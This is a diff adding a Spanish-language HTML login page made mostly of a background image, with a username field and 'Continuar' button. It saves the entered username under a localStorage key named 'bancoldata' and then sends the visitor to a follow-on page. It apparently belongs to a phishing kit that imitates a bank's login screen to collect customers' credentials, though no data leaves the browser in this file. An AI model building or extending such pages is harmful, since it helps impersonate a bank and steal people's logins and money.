@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image-based Website</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body, html {
+            height: 100%;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+        }
+        /* Loader styles */
+        .loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .loader div {
+            width: 40px;
+            height: 40px;
+            background-color: #3498db;
+            animation: loader 1s infinite ease-in-out;
+        }
+        @keyframes loader {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.5);
+            }
+        }
+        /* Page styles */
+        .image-container {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: relative;
+        }
+        .image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .center-box {
+            position: absolute;
+            top: 53%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgb(255, 255, 255);
+            width: 500px;
+            height: 100px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 8px;
+        }
+        .center-box .input-container {
+            position: relative;
+            width: 80%;
+        }
+        .center-box input {
+            width: 100%;
+            padding: 10px;
+            padding-left: 40px;
+            font-size: 19px;
+            border: none;
+            border-bottom: 1px solid red;
+            outline: none;
+        }
+        .center-box .input-container i {
+            position: absolute;
+            left: 4px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+            font-size: 20px;
+        }
+        .button-container {
+            position: absolute;
+            top: 68%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            gap: 10px;
+        }
+        .button-container button {
+            padding: 21px 75px;
+            font-size: 16px;
+            border: none;
+            border-radius: 50px;
+            font-weight: bold;
+            color: rgb(1, 1, 1);
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .button-container button:first-child {
+            background-color: #ffffff;
+            border: 1px solid black;
+        }
+        .button-container button:first-child:hover {
+            background-color: #ffffff;
+        }
+        .button-container button:last-child {
+            background-color: #cccccc;
+            color: #666666;
+            cursor: not-allowed;
+        }
+        .button-container button:last-child.enabled {
+            background-color: #ffda37;
+            cursor: pointer;
+            color: rgb(1, 1, 1);
+        }
+        .button-container button:last-child.enabled:hover {
+            background-color: #ffb800;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+</head>
+<body>
+    <!-- Loader -->
+    <div class="loader">
+        <div></div>
+    </div>
+
+    <div class="image-container" style="display: none;">
+        <img src="img/1.png" alt="Background Image">
+        <div class="center-box">
+            <div class="input-container">
+                <i class="fas fa-user"></i>
+                <input type="text" placeholder="Usuario" id="userInput">
+            </div>
+        </div>
+        <div class="button-container">
+            <button>Cancelar</button>
+            <button id="continueButton" class="disabled">Continuar</button>
+        </div>
+    </div>
+
+    <script>
+        // Mostrar loader hasta que la página cargue completamente
+        window.addEventListener('load', () => {
+            const loader = document.querySelector('.loader');
+            const pageContent = document.querySelector('.image-container');
+            
+            // Ocultar loader y mostrar contenido
+            loader.style.display = 'none';
+            pageContent.style.display = 'block';
+        });
+
+        // Verificar si el usuario está en un dispositivo móvil
+        if (window.innerWidth <= 800) {
+            window.location.href = "cel-login.html";
+        }
+
+        const userInput = document.getElementById('userInput');
+        const continueButton = document.getElementById('continueButton');
+
+        // Habilitar/Deshabilitar el botón
+        userInput.addEventListener('input', () => {
+            const userValue = userInput.value.trim();
+            if (userValue.length >= 4) {
+                continueButton.classList.add('enabled');
+                continueButton.classList.remove('disabled');
+            } else {
+                continueButton.classList.add('disabled');
+                continueButton.classList.remove('enabled');
+            }
+        });
+
+        // Acción al hacer clic en "Continuar"
+        continueButton.addEventListener('click', () => {
+            const userValue = userInput.value.trim();
+            if (userValue.length >= 4) {
+                let bancoldata;
+                try {
+                    const storedData = localStorage.getItem('bancoldata');
+                    bancoldata = storedData ? JSON.parse(storedData) : {};
+                } catch (e) {
+                    console.error('Error al parsear bancoldata:', e);
+                    bancoldata = {};
+                }
+                bancoldata.usuario = userValue;
+                localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+                window.location.href = 'index-cel.html';
+            } else {
+                alert('Por favor, ingrese un usuario válido de al menos 4 caracteres.');
+            }
+        });
+    </script>
+</body>
+</html>
